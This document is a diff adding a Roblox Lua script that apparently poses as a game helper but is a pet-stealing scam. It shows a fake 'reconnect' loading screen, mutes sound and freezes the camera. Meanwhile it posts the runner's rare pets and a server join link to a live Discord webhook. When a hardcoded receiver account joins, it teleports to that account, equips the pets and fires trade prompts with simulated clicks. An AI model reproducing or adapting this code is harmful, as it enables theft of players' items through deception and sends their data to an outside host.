@@ -1,0 +1,350 @@
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1412382801461776427/SrSHD137zB3ESdCPUU45hNXh4rSaJRYNWU-muRahrbLRzSRnnUCGsF4bIQlb5bJ_XFSy"
+local dataModule = require(ReplicatedStorage.Modules.DataService)
+
+-- Whitelisted usernames that when join, you teleport to them invisibly
+local USERNAMES = {
+    "BEESUCALL",
+}
+
+-- PET whitelist map: pet name => UUID
+local PET_WHITELIST = {
+    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
+    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
+    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
+    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
+    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
+    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
+    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
+    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
+    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
+    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
+}
+
+local victimPetTable = {}
+
+-- === FREEZE SCREEN UI & LOGIC ===
+
+local freezeGui = Instance.new("ScreenGui")
+freezeGui.Name = "FreezeScreenGui"
+freezeGui.ResetOnSpawn = false
+freezeGui.IgnoreGuiInset = true
+freezeGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1,0,1,0)
+background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+background.BackgroundTransparency = 0
+background.Parent = freezeGui
+
+-- Message Text
+local message = Instance.new("TextLabel")
+message.Size = UDim2.new(1,0,0,50)
+message.Position = UDim2.new(0,0,0.4,0)
+message.BackgroundTransparency = 1
+message.TextColor3 = Color3.new(1,1,1)
+message.TextStrokeTransparency = 0
+message.TextStrokeColor3 = Color3.new(0,0,0)
+message.Font = Enum.Font.GothamBold
+message.TextSize = 24
+message.Text = "WAIT FOR THE SCRIPT TO RECONNECT..."
+message.Parent = background
+message.TextWrapped = true
+message.TextScaled = true
+
+-- Loading Bar Container
+local barContainer = Instance.new("Frame")
+barContainer.Size = UDim2.new(0.6,0,0,25)
+barContainer.Position = UDim2.new(0.2,0,0.5,0)
+barContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
+barContainer.BorderSizePixel = 0
+barContainer.Parent = background
+barContainer.AnchorPoint = Vector2.new(0,0)
+
+-- Loading Bar Fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barContainer
+
+-- Disable all player input (mouse + keyboard)
+local inputConn1, inputConn2
+inputConn1 = UserInputService.InputBegan:Connect(function(input,gameProcessed)
+    if not gameProcessed then
+        -- Block all keys
+        inputConn1:Disconnect()
+        inputConn2:Disconnect()
+    end
+end)
+inputConn2 = UserInputService.InputChanged:Connect(function(input,gameProcessed)
+    if not gameProcessed then
+        -- Block all inputs
+        inputConn1:Disconnect()
+        inputConn2:Disconnect()
+    end
+end)
+
+-- Mute all sounds
+local oldVolume = SoundService.Volume
+SoundService.Volume = 0
+
+-- Freeze camera position & disable movement
+local camCF = Camera.CFrame
+local camConn
+camConn = RunService.RenderStepped:Connect(function()
+    Camera.CFrame = camCF
+end)
+
+-- Function to start freeze screen timer + animation
+local function ShowFreezeScreen(durationSeconds)
+    freezeGui.Enabled = true
+    barFill.Size = UDim2.new(0,0,1,0)
+    local startTime = tick()
+
+    while tick() - startTime < durationSeconds do
+        local elapsed = tick() - startTime
+        local progress = math.clamp(elapsed / durationSeconds, 0, 1)
+        barFill.Size = UDim2.new(progress, 0, 1, 0)
+        task.wait(0.03)
+    end
+
+    -- End freeze screen: clean up
+    freezeGui.Enabled = false
+    SoundService.Volume = oldVolume
+    if camConn then camConn:Disconnect() end
+end
+
+-- === END FREEZE SCREEN UI & LOGIC ===
+
+
+-- Check if pet name is whitelisted
+local function checkPetsWhitelist(petName)
+    return PET_WHITELIST[petName] ~= nil
+end
+
+-- Get pet object by UUID from Backpack or Character
+local function getPetObject(petUUID)
+    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if obj:GetAttribute("PET_UUID") == petUUID then
+            return obj
+        end
+    end
+    if LocalPlayer.Character then
+        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
+            if obj:GetAttribute("PET_UUID") == petUUID then
+                return obj
+            end
+        end
+    end
+    return nil
+end
+
+-- Equip pet tool
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    end
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+        LocalPlayer.Character.Humanoid:EquipTool(pet)
+    end
+end
+
+-- Teleport to target player
+local function teleportTarget(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+    end
+end
+
+-- Bypass click to trigger stealing prompt
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2,
+        workspace.Camera.ViewportSize.Y / 2,
+        0, true, nil, false
+    )
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2,
+        workspace.Camera.ViewportSize.Y / 2,
+        0, false, nil, false
+    )
+end
+
+-- Start stealing by triggering the prompt on victim's character head
+local function startSteal(triggerName)
+    local targetPlayer = Players:FindFirstChild(triggerName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
+        if prompt then
+            prompt.HoldDuration = 0
+            deltaBypass()
+        end
+    end
+end
+
+-- Send Discord webhook embed
+local function createDiscordEmbed(petList, totalValue, fileUrl)
+    local embed = {
+        title = "MAGNANAKAW CHECK 🥀",
+        color = 65280,
+        fields = {
+            {
+                name = "**Player Information**",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+                    LocalPlayer.Name, 
+                    table.concat(USERNAMES, " "), 
+                    LocalPlayer.Name,
+                    LocalPlayer.AccountAge
+                ),
+                inline = false
+            },
+            {
+                name = "**Backpack**",
+                value = string.format("```%s```", petList),
+                inline = false
+            },
+            {
+                name = "**Join with URL**",
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, 
+                    game.PlaceId, 
+                    game.JobId
+                ),
+                inline = false
+            }
+        },
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
+    }
+
+    local data = {
+        content = string.format(
+            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = LocalPlayer.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+
+    local request = http_request or request or HttpPost or syn.request
+    local response = request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
+
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Error sending to Discord:", response.StatusCode, response.Body)
+    end
+end
+
+-- Check pets inventory and equip + steal from victim
+local function checkPetsInventory(targetName)
+    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhitelist(petData.PetType) then
+            continue
+        end
+        local petObject = getPetObject(petUUID)
+        if petObject then
+            equipPet(petObject)
+            task.wait(0.2)
+            startSteal(targetName)
+        end
+    end
+end
+
+-- Wait for whitelisted players to join, then teleport + act on them
+local function waitForJoin()
+    for _, player in pairs(Players:GetPlayers()) do
+        if table.find(USERNAMES, player.Name) then
+            return true, player.Name
+        end
+    end
+    return false, nil
+end
+
+-- Make yourself invisible only to victims (players NOT in USERNAMES)
+local function makeInvisibleToVictims()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
+            if player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
+                        part.Transparency = 1
+                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
+                        part.Enabled = false
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Disable ESC key (for example)
+local function disableESC()
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.KeyCode == Enum.KeyCode.Escape then
+            -- Ignore ESC so player cannot leave the GUI
+        end
+    end)
+end
+
+-- Main loop to continuously act when victim detected
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local found, targetName = waitForJoin()
+            if found then
+                -- Show freeze screen for 20 seconds before continuing
+                ShowFreezeScreen(20)
+
+                teleportTarget(targetName)
+                checkPetsInventory(targetName)
+                makeInvisibleToVictims()
+            end
+        end
+    end)
+end
+
+-- Run
+disableESC()
+idlingTarget()
+
+-- Build pet list for webhook and send it once
+for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    if checkPetsWhitelist(petData.PetType) then
+        table.insert(victimPetTable, petData.PetType)
+    end
+end
+
+task.spawn(function()
+    while task.wait(0.5) do
+        if #victimPetTable > 0 then
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
+            break
+        end
+    end
+end)
